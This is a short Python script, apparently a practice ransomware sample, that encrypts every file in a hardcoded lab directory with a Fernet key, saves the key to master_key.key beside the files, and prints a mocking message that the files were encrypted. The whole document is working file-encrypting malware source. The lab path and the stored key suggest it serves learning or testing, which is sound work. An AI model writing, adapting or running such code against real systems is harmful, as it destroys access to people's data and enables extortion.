import os
from cryptography.fernet import Fernet
files = []
directory_ransomware = "/home/vmadmin/workspace/ransomware/files"
os.chdir(directory_ransomware)

for file in os.listdir():
    if os.path.isfile(file):
        files.append(file)

os.chdir(directory_ransomware)
key= Fernet.generate_key()
with open("master_key.key", "wb") as master_key:
    master_key.write(key)

os.chdir(directory_ransomware)

for file in files:
    with open(file,"rb") as the_file:
         content = the_file.read()
    content_encrypted = Fernet(key).encrypt(content)
    with open(file,"wb") as the_file:
        the_file.write(content_encrypted)
print(" your files was encrypted by the man in the middle man from mars !")        
    
